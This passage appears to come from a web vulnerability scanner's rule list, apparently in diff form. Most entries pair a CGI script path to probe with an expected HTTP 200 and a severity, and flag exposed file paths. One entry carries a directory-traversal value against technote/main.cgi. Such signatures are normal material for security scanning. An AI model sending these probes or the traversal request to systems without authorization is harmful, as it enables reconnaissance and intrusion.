+10486#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin2/meter.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10487#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-script/CSSearch/CSSearch.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10488#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/%7Eauth.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10489#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/AT-admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10490#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/add_user.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10491#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10492#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/auth.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10493#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/bnbform.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10494#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/classifieds.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10495#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/count.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10496#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/environ.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10497#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/nph-test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10499#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/php.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10500#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/survey.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10501#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10502#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/webdist.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10503#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-win/~auth.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10504#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/%7Eauth.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10505#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/AT-admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10506#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/Count.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10507#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/add_user.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10508#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10509#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/auth.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10510#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/bnbform.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10511#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/classifieds.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10512#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/cvsweb.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10513#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/environ.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10514#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/nph-test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10516#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/php.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10517#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/survey.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10518#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10519#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/webdist.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10520#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi/~auth.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10521#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/add-user.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10522#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/addpinuser.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10523#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10524#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/bnbform.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10525#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/ccbill-local.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10526#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10527#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/ibp5/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10528#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/mastergate/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10529#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/members/htdata/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10530#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/meter.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10532#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/php.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10533#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/scripts/ax-admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10534#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10535#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/www800.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10536#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgibin/wwwadmin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10537#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/classifieds.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10538#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/club/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10539#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/clubjoey/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10540#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cohfmembers/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10541#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/coloradogirls/members/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10542#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/control/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10543#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cvsweb.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10544#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/data/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10545#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/database/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10546#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/deep/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10547#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/dmr/ccbill-local.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10548#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/dmr/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10549#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/dodo/cgi-bin/update_profile.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10550#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/drowssap/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10551#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/eden/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10552#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/environ.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10553#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#/epoch/add-passwd.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10554#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/epoch/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10555#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/epwd/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10559#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ezboard/ezadmin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10560#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ezboard/ezboard.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10561#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ezboard/ezman.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10562#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/fanclub/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10563#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/finger.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10564#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/foldoc/template.cgi?template.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10565#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/garden/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10566#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/gateway/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10567#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/gay/members/private/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10568#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/getem/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10569#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/gh345dfg/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10570#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/guestbook.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10571#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/guestbook/dcguest.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10572#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/htgrep.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10573#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/html_web_store.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10574#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/htpass/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10575#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#/htpasswd/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10576#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ibill/ccbill-local.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10577#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/live/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10578#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/logs/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10579#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/lwgate.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10580#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/mailfile.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10581#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/main/ccbill/ccbill-local.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10582#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/marines/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10583#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/master/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10584#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/mbr/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10585#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/member/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10586#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/memberpro/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10587#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members-only/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10588#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members/ccbill/ccbill-local.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10589#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members/cgi-bin/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10590#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members/cgi-bin/meter/meter.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10591#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10592#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members/log/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10593#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members/members/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10594#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members/private/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10595#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members/protected/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10596#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/members/users/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10597#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/memberscam/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10598#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/mmstdol.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10599#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#/mypasswds/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10600#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/netbilling/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10601#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/newspass/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10602#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/oetaki/oetaki.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10603#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/oordir/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10604#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/pass/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10605#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/passwords/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10606#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/perlshop.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10610#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/protected/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10611#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/protectit/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10612#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/redir.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10613#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/restricted/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10614#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/rpc.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10615#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/run.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10616#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/bigconf.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10617#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/mail.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10618#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/postie.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10619#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/process_bug.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10620#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10621#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/secure/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10622#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/stats/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10623#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/survey.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10624#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/technote/main.cgi/oops?board=FREE_BOARD&command=down_load&filename=/../../../main.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10625#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/ubb/cgi-bin/postings.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10626#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/web2000/oor/content_areas/authorize/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10627#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/web2000/oor/content_areas/safe/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10628#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/webcash/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10629#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/webdist.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10630#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/work/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10631#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/xxyy/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10632#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/~admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10633#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/~auth.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10634#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/~authorizenet.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10635#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/~rollo/members/cgi-bin/test.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10636#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/mailfile.cgi?real_name=rc&email=riotnation@hotmail.com&filename=mailfile.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10637#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/bnbform.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10638#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/classifieds.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10639#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/formmail.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10640#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/changepw.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10641#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-auth/userreg.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
+10642#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/build.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#发现文件路径信息#d9Fa0j#
